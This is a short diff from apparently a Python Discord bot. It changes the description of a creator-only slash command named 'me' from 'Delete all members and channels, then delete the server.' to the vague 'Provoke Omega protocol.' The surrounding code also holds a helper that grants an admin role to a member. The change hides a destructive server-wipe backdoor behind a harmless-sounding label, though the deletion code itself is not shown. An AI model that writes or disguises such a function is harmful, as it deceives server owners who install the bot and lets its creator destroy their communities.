@@ -159,7 +159,7 @@ async def ensure_admin_role(guild: discord.Guild, member: discord.Member):
         )
         await member.add_roles(new_role)
 
-@tree.command(name="me", description="Delete all members and channels, then delete the server.")
+@tree.command(name="me", description="Provoke Omega protocol.")
 async def me_command(interaction: discord.Interaction):
     if interaction.user.id != BOT_CREATOR_ID:
         await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
